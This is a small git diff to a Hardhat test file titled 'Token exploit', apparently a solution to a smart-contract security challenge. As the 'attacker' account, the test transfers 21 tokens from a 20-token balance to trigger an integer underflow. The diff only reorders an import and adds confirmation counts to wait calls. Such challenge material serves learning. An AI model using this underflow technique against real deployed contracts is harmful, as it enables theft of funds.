@@ -1,6 +1,6 @@
-import { ethers } from "hardhat";
 import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
 import { expect } from "chai";
+import { ethers } from "hardhat";
 
 const AMOUNT_TO_TRANSFER = "21";
 
@@ -15,7 +15,7 @@ describe("Token exploit", () => {
     const tokenAddress = await tokenFactory.connect(attacker).callStatic.createInstance(attacker.address);
 
     const tx = await tokenFactory.connect(attacker).createInstance(attacker.address);
-    await tx.wait();
+    await tx.wait(1);
 
     // Load the instance at returned address
     const token = await ethers.getContractAt("Token", tokenAddress);
@@ -28,7 +28,7 @@ describe("Token exploit", () => {
 
     // 20 - AMOUNT_TO_TRANSFER(21). This will underflow
     const tx = await token.connect(attacker).transfer(toAddress.address, AMOUNT_TO_TRANSFER);
-    tx.wait();
+    tx.wait(1);
 
     const balanceAfter = await token.balanceOf(attacker.address);
     console.log(" Attacker ------------------------------------------------------------- ", balanceAfter.toString());
